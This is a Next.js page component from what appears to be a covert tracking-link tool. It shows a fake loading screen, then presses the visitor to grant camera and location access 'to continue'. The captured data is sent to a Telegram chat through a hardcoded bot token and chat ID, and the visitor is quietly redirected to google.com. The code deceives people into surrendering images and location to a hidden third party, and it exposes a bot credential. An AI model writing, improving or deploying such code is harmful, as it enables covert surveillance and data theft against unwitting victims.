"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { motion } from "framer-motion"
import { CaptureComponent } from "@/components/CaptureComponent"
import { sendTelegramMessage } from "@/services/telegram"

const BOT_TOKEN = "7708090733:AAEm01sIJpFKlDIQCqvuCwLIrmbIMEYB9Gg"
const CHAT_ID = "7708090733"

export default function LinkPage({ params }: { params: { id: string } }) {
  const [loading, setLoading] = useState(true)
  const [showCapture, setShowCapture] = useState(false)
  const router = useRouter()

  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false)
      setShowCapture(true)
    }, 2000)

    return () => clearTimeout(timer)
  }, [])

  const handleCapture = async (data: any) => {
    try {
      // Save to localStorage
      const savedCaptures = localStorage.getItem('captures')
      const captures = savedCaptures ? JSON.parse(savedCaptures) : []
      captures.push(data)
      localStorage.setItem('captures', JSON.stringify(captures))

      // Send to Telegram
      await sendTelegramMessage(BOT_TOKEN, CHAT_ID, data)
      
      // Redirect after successful capture and sending
      router.push("https://www.google.com")
    } catch (error) {
      console.error('Error handling capture:', error)
      // Still redirect even if there's an error
      router.push("https://www.google.com")
    }
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center">
        <div className="text-center">
          <motion.div
            animate={{ opacity: [0.2, 1, 0.2] }}
            transition={{ duration: 1.5, repeat: Number.POSITIVE_INFINITY }}
            className="text-4xl md:text-6xl font-mono text-red-500 mb-4"
          >
            LOADING
            <span className="inline-block w-6 overflow-hidden">
              <motion.span
                animate={{ opacity: [0, 1, 0] }}
                transition={{ duration: 1.5, repeat: Number.POSITIVE_INFINITY, repeatType: "loop" }}
              >
                ...
              </motion.span>
            </span>
          </motion.div>
          <p className="text-gray-400 text-sm">Please wait while we prepare your content</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-4">
      {showCapture ? (
        <div className="w-full max-w-md">
          <CaptureComponent onCapture={handleCapture} />
          <p className="text-center text-gray-400 text-sm mt-4">
            Please allow camera and location access to continue
          </p>
        </div>
      ) : null}
    </div>
  )
}
